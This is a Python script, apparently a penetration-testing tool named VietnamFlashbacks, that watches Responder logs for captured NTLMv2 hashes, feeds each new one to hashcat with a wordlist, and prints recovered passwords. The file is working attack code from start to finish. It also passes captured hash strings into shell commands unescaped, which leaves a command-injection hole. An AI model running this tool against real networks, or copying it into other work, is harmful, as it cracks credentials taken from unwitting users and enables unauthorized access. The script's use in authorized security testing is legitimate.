#!/usr/bin/python3

import argparse    # for getting those command line arguments
import getopt   # for getting those command line arguments
import os    # for os path stuff
# import platform    # for detectind whether it is Nix or Windows
import re    # for searching for hashes
import subprocess    # for spawning hashcat process
import sys    # for stopping gracefully
from termcolor import colored    # for not to miss this recovered pass :)
import traceback    # for when it shits its pants and doesn't stop gracefully

vietnam = """
 _     _  __________      __   _     
\ \  /| || |_  | || |\ | / /\ | |\/| 
 \_\/ |_||_|__ |_||_| \|/_/--\|_|  | 

"""
flashbacks = """
 _____     __   __  _    ___   __    __   _    __  
| |_| |   / /\ ( (`| |_|| |_) / /\  / /` | |_/( (` 
|_| |_|__/_/--\_)_)|_| ||_|_)/_/--\ \_\_,|_| \_)_) 
"""

print(colored(vietnam, "green", attrs=['bold']))
print(colored(flashbacks, "green", attrs=['bold']))

print(colored("Real-time NTLMv2 bruteforcer, VietnamFlashbacks 0.9.0beta", "yellow", attrs=['bold']))
print("Press Ctrl+C as soon as you pwnd what you wanted\n")

print("Brought to you by Dmitry Kireev (@InfiniteSuns)\n")

responderdir = None    # variable to hold path to responder
dictdir = None    # variable to hold path to dictionary
# hashcatdir = None

logfile = None    # variable to hold path to logfile
potfile = None    # variable to hold path to potfile

# osname = platform.system()

argparser = argparse.ArgumentParser()
argparser.add_argument('-r', '--responder', help="i.e. /root/github/responder", required=True)
argparser.add_argument('-d', '--dictionary', help="i.e. /usr/share/wordlists/rockyou.txt", required=True)
args = argparser.parse_args()

if args.responder:
    print("[i] Responder path recieved as argument")
    if os.path.exists(args.responder):
        print("[+] Responder path seems legit\n")
        responderdir = args.responder + "logs/"
    else:
        print("[-] Responder path seems not legit\n")
        sys.exit()
if args.dictionary:
    print("[i] Dictionary path recieved as argument")
    if os.path.exists(args.dictionary):
        print("[+] Dictionary path seems legit\n")
        dictdir = args.dictionary
    else:
        print("[-] Dictionary path seems not legit\n")
        sys.exit()

print("[i] Checking current directory")
try:
    process = subprocess.Popen("pwd", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, shell=True, universal_newlines=True)
except Exception:
    print(colored("[!] Had hard time checking current directory and failed!",
                  "red"))
    traceback.print_exc(file=sys.stdout)
    sys.exit(0)

workingdir = process.stdout.readlines()
workingdir = str.strip(workingdir[0])
print("[i] Directory detected as " + workingdir + "\n")

logfile = workingdir + "/VietnamFlashbacks.log"
potfile = workingdir + "/VietnamFlashbacks.potfile"

print("[~] Checking if logfile exists")
if os.path.exists(logfile):
    print("[i] Logfile already exists\n")
else:
    try:
        logfileptr = open(logfile, "w")
        logfileptr.close()
        print("[i] Logfile was created\n")
    except Exception:
        print(colored("[!] Had hard time creating logfile and failed!",
                      "red"))
        traceback.print_exc(file=sys.stdout)
        sys.exit(0)

print("[~] Checking if potfile exists")
if os.path.exists(potfile):
    print("[i] Potfile already exists\n")
else:
    try:
        potfileptr = open(potfile, "w")
        potfileptr.close()
        print("[i] Potfile was created\n")
    except Exception:
        print(colored("[!] Had hard time creating potfile and failed!",
                      "red"))
        traceback.print_exc(file=sys.stdout)
        sys.exit(0)

ntlmv2pattern = re.compile('(^.*::\w*:\w*:\w*:\w*)')    # regexp to look for in responder logs
crackedntlmv2pattern = re.compile('(^.*::\w*:\w*:\w*:\w*:.*)')    # regexp to look for in hashcat potfile

try:
    while True:
        for file in os.listdir(responderdir):
            if file.endswith(".txt"):
                for i, line in enumerate(open(os.path.join(responderdir, file))):
                    for match in re.finditer(ntlmv2pattern, line):
                        username = match.groups()[0].split('::')[0]
                        domain = match.groups()[0].split('::')[1].split(':')[0]

                        try:
                            logfilebuf = open(logfile, "r").read()
                        except Exception:
                            print(colored("[!] Had hard time reading logfile and failed!",
                                          "red"))
                            traceback.print_exc(file=sys.stdout)
                            sys.exit(0)

                        if not username in logfilebuf:
                            print(colored("[+] New hash discovered for " + username + ", writing to logfile",
                                          "green"))
                            print("[i] Passing to hashcat\n")

                            output = subprocess.Popen(
                                "hashcat -m 5600 " + match.groups()[0] + " " + dictdir +
                                " --potfile-path " + potfile,
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, shell=True, universal_newlines=True)
                            results = output.stdout.readlines()
                            errors = output.stderr.readlines()

                            for error in errors:    # sometimes hashcat freezes in background, have to deal with it
                                if "running on pid" in error:
                                    pidpattern = re.compile('(pid \d+)')
                                    pid = re.search(pidpattern, error).group()
                                    pid = pid.replace("pid ", "")

                                    output = subprocess.Popen(
                                        "kill " + pid,
                                        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, shell=True, universal_newlines=True)
                                    results = output.stdout.readlines()
                                    errors = output.stderr.readlines()

                                    print(colored("[!] Looks like hashcat freezed in background, had to kill it\n",
                                                  "red"))

                            for result in results:
                                if "Recovered" in result:
                                    if "1/1" in result:
                                        try:
                                            for j, potline in enumerate(open(potfile, "r")):
                                                for potmatch in re.finditer(crackedntlmv2pattern, potline):
                                                    potusername = potmatch.groups()[0].split('::')[0]
                                                    potdomain = potmatch.groups()[0].split('::')[1].split(':')[0]

                                                    if username.lower() == potusername.lower() \
                                                            and domain.lower() == potdomain.lower():
                                                        password = potmatch.groups()[0].split('::')[1].split(':')[4]
                                        except Exception:
                                            print(colored("[!] Had hard time reading potfile and failed!",
                                                          "red"))
                                            traceback.print_exc(file=sys.stdout)
                                            sys.exit(0)

                                        print(colored("[!] Password recovered for " + username + ": " + password + "\n",
                                                      "red", attrs=['bold']))

                            logfileptr = open(logfile, "a")
                            logfileptr.write(match.groups()[0])
                            logfileptr.write('\n')
                            logfileptr.close()
except KeyboardInterrupt:
    print(colored("[i] Ctrl+C caught, stopping gracefully",
                  "red"))
except Exception:
    traceback.print_exc(file=sys.stdout)
    sys.exit(0)
